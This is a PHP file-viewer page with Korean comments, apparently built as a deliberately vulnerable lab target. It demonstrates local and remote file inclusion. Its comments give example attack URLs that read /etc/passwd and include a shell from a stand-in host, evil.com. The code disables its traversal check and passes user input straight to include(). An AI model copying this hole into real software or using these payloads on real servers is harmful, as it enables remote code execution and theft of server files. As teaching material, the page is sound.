<?php
// LFI (Local File Inclusion) 취약점:
// 사용자가 전달한 파일 경로를 그대로 사용하여 서버의 로컬 파일을 읽을 수 있습니다.
// 공격 예시: /file_viewer.php?file=../../../../etc/passwd
//
// RFI (Remote File Inclusion) 취약점:
// php.ini 설정에서 allow_url_include=On으로 설정된 경우, 원격 서버의 악성 파일을 포함시켜 실행할 수 있습니다.
// 공격 예시: /file_viewer.php?file=http://evil.com/shell.php
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Viewer</title>
</head>
<body>

<h2>File Viewer</h2>

<h3>Uploaded Files</h3>
<ul>
    <?php
    $upload_dir = 'uploads/';
    $files = scandir($upload_dir);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            echo '<li><a href="?file=' . urlencode($upload_dir . $file) . '">' . htmlspecialchars($file) . '</a></li>';
        }
    }
    ?>
</ul>

<hr>

<?php
if (isset($_GET['file'])) {
    $file_path = $_GET['file'];

    // 디렉토리 트레버셜 대책 (현재 비활성화됨)
    // if (strpos($file_path, '..') !== false) {
    //     die('Directory traversal attempt detected.');
    // }

    $file_extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $allowed_image_extensions = ['jpg', 'jpeg', 'png', 'gif'];
    $allowed_text_extensions = ['txt', 'php', 'html', 'css', 'js', 'md'];

    if (in_array($file_extension, $allowed_image_extensions)) {
        echo '<h3>Viewing Image: ' . htmlspecialchars(basename($file_path)) . '</h3>';
        echo '<img src="' . htmlspecialchars($file_path) . '" alt="Image" style="max-width: 800px;">';
    } elseif (in_array($file_extension, $allowed_text_extensions)) {
        echo '<h3>Viewing Text File: ' . htmlspecialchars(basename($file_path)) . '</h3>';
        if (file_exists($file_path)) {
            echo '<pre>' . htmlspecialchars(file_get_contents($file_path)) . '</pre>';
        } else {
            echo '<p>File not found.</p>';
        }
    } else {
        echo '<p>Unsupported file type. Only images (jpg, jpeg, png, gif) and text files can be viewed.</p>';
        include($file_path);
    }
}
?>

</body>
</html>
